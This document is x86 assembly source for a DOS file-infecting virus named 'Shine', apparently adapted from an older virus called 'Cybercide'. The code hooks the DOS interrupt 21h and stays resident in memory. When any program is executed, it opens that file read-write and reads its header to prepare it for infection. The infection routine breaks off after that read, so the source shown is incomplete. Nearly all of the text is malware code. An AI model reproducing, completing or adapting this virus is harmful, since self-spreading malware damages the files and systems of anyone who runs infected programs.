;---------------
; The shine DOS virus
; Based on the Cybercide DOS virus

org 0h


call short $+3  ; To calculate delta offset
start:
     pop bp           ; BP = Delta+3
     sub bp, 3        ; To get to the True start of the virus
     mov word [data_section.save_bp+bp], bp
     mov word [new_int21.bp_shi+bp], bp

     mov ax, 9a8ah    ; Are we in memory yet?
     int 21h          ; Call to int 21h
     cmp ax, 8b7bh    ; Is AX 8b7b?
     je dont_install
install:
     mov ax, 3521h    ; Get vector 21h
     int 21h          ; call int 21h
     mov word [goto_int21+bp+1], bx  ; Save Int 21h offset
     mov word [goto_int21+bp+3], es  ; And segment
     mov ax, 2521h         ; Set vector 21h
     mov dx, new_int21+bp  ; DS:DX = new_int21
     int 21h
     mov ax, 3100h         ; Terminate and Stay resident
     int 21h


dont_install:
     mov ax, 4c00h
     int 21h



new_int21:
     pusha
     push bp
     push ax
     call near .past_bp
.bp_shi dw 0
.past_bp: 
     pop bp
     sub bp, 2
     mov word ax, [bp]
     mov bp, ax             ; BP = file delta offset
     pop ax
.what_func:
     cmp ax, 9a8ah        ; Loaded?
     je send_msg          ; Report that we are in memory
     cmp ax, 4b00h        ; Load and Execute (Exec), function 0
     je infect            ; On entry: DS:DX = ASCIIZ filename pointer


.call_int21:
     jmp short goto_int21



goto_int21: db 0EAh, 00h, 00h, 00h, 00h   ; Jump far, absolute, address given in operand

send_msg:
     mov ax, 8b7bh     ; In Mem Signature
     iret

infect:            ; DS:DX = ASCIIZ Filename pointer
     mov ax, 3d02h
     int 21h      ; Open file Using Handle, Read Write. OUT: AX = Handle
     mov bx, ax   ; BX = File Handle
     push bx
     xor cx, cx
     xor dx, dx    ; low order and high order = 0
     mov ax, 4200h ; Move file pointer
     int 21h
     pop bx
     push bx          ; BX = File Handle
     mov ax, 3f00h    ; Read file or device
     mov cx, 2        ; Read 2 bytes, this case from the start to check wheter it's a COM file or an MZ Executable
     mov dx, data_section.MZ_BUF+bp  ; Pointer to the MZ buffer
     int 21h          ; Callin int 21h
        
data_section:
     .save_bp dw 0
     .file_infected db 'Shine'
     .MZ_BUF dw 0
